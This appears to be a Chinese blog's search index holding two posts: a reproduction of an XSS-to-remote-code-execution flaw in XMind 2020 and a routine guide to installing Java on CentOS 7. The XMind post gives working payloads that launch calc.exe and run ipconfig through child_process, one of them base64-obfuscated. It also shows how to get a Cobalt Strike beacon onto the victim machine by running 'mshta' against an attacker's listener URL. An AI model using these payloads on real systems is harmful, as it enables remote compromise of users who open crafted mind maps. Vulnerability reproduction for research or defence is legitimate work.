<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XMind思维导图XSS漏洞复现</title>
      <link href="2021/05177225.html"/>
      <url>2021/05177225.html</url>
      
        <content type="html"><![CDATA[<p><strong>简介</strong>：XMind 是一个全功能的思维导图和头脑风暴软件，为激发灵感和创意而生。作为一款有效提升工作和生活效率的生产力工具，受到全球百千万用户的青睐。近期各大公众号平台曝出XMind xss存在远程执行RCE漏洞，我也是今天进行了漏洞复现。</p><p><strong>环境</strong>：XMind-2020-for-Windows-64bit-10.3.1-202101070032.exe</p><p><strong>复现</strong>：</p><p>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</p><p>payload：</p><pre class=" language-html"><code class="language-html">&lt;img src=# onerror=alert('1')></code></pre><p><img src="../images/4.png"></p><p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p><p>2.测试RCE命令，我们通过打开计算器来展示。</p><p>payload：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>require(<span class="token punctuation">'</span>child_process<span class="token punctuation">'</span>).exec(<span class="token punctuation">'</span>calc.exe<span class="token punctuation">'</span>,null);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p><img src="../images/5.png"></p><p>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</p><p>payload：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs<span class="token punctuation">=</span>`,`base64`).toString())<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></code></pre><pre class=" language-markdown"><code class="language-markdown">cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=</code></pre><p>经过base64解码是：</p><pre class=" language-markdown"><code class="language-markdown">require('child_process').exec('ipconfig /all',(error, stdout, stderr)=>{    alert(<span class="token code keyword">`stdout: ${stdout}`</span>);  });</code></pre><p><img src="../images/6.png"></p><p>4.我们直接上cs</p><p><img src="../images/7.png"></p><p>（1）首先我们生成一个powershell command的payload</p><p><img src="../images/8.png"></p><p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p><p><img src="../images/9.png"></p><p> 生成的url为：</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你设置的监听器IP:80/download/file.ext</code></pre><p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p><pre class=" language-http"><code class="language-http">mshta http://你设置的监听器IP:80/download/file.ext</code></pre><p>（3）接着我们构造执行的XSS代码</p><p>原始攻击payload：</p><pre class=" language-html"><code class="language-html">&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=>{    alert(`stdout: ${stdout}`); });`,`base64`).toString())'></code></pre><p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p><p>接着我们就看到cs上线成功</p><p><img src="../images/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> XSS </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7服务器安装java环境</title>
      <link href="2021/051762838.html"/>
      <url>2021/051762838.html</url>
      
        <content type="html"><![CDATA[<p>前言：最近看到阿里云主机有新人优惠，嘿嘿。我就注册了一个新的账号，买了一台，然后开始安装我们的各种工具。但是，安装工具时发现java环境没有装，于是我就开始我的安装之旅。</p><h2 id="1-打开url选择jdk1-8下载"><a href="#1-打开url选择jdk1-8下载" class="headerlink" title="1.打开url选择jdk1.8下载"></a>1.打开url选择jdk1.8下载</h2><p>[<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html]</a></p><p>我选择Linux x64的版本：</p><p><img src="../images/1.png"></p><h2 id="2-下载"><a href="#2-下载" class="headerlink" title="2.下载"></a>2.下载</h2><p>这里你可以选择在服务器中直接使用命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> https://download.oracle.com/otn/java/jdk/8u291-b10/d7fc238d0cbf4b0dac67be84580cfb4b/jdk-8u291-linux-x64.tar.gz</code></pre><p>当然了你也可以将压缩包下载到本地利用finalshell进行上传</p><p><img src="../images/2.png"></p><p>下载之后通过命令核对安装包大小是否符合</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> -lht</code></pre><h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3.安装"></a>3.安装</h2><h6 id="（1）首先创建安装目录"><a href="#（1）首先创建安装目录" class="headerlink" title="（1）首先创建安装目录"></a>（1）首先创建安装目录</h6><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> /usr/local/java/</code></pre><h6 id="（2）然后将下载下来的压缩包解压到安装目录"><a href="#（2）然后将下载下来的压缩包解压到安装目录" class="headerlink" title="（2）然后将下载下来的压缩包解压到安装目录"></a>（2）然后将下载下来的压缩包解压到安装目录</h6><pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf jdk-8u291-linux-x64.tar.gz -C /usr/local/java</code></pre><p>注意：这里的-C是指定压缩目录</p><h2 id="4-设置环境变量"><a href="#4-设置环境变量" class="headerlink" title="4.设置环境变量"></a>4.设置环境变量</h2><h6 id="（1）打开文件"><a href="#（1）打开文件" class="headerlink" title="（1）打开文件"></a>（1）打开文件</h6><pre class=" language-bash"><code class="language-bash">vim /etc/profile</code></pre><h6 id="（2）shift-g进入文末，按i进入编辑模式，在最后一行开始添加"><a href="#（2）shift-g进入文末，按i进入编辑模式，在最后一行开始添加" class="headerlink" title="（2）shift+g进入文末，按i进入编辑模式，在最后一行开始添加"></a>（2）shift+g进入文末，按i进入编辑模式，在最后一行开始添加</h6><pre><code>export JAVA_HOME=/usr/local/java/jdk1.8.0_291export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH</code></pre><h6 id="（3）使得环境变量生效"><a href="#（3）使得环境变量生效" class="headerlink" title="（3）使得环境变量生效"></a>（3）使得环境变量生效</h6><pre class=" language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile</code></pre><h6 id="（4）添加软连接（快捷方式）"><a href="#（4）添加软连接（快捷方式）" class="headerlink" title="（4）添加软连接（快捷方式）"></a>（4）添加软连接（快捷方式）</h6><pre class=" language-shell"><code class="language-shell">ln -s /usr/local/java/jdk1.8.0_291/bin/java /usr/bin/java</code></pre><h2 id="5-检查"><a href="#5-检查" class="headerlink" title="5.检查"></a>5.检查</h2><pre class=" language-shell"><code class="language-shell">java -version</code></pre><p><img src="../images/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 菜鸡日常 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
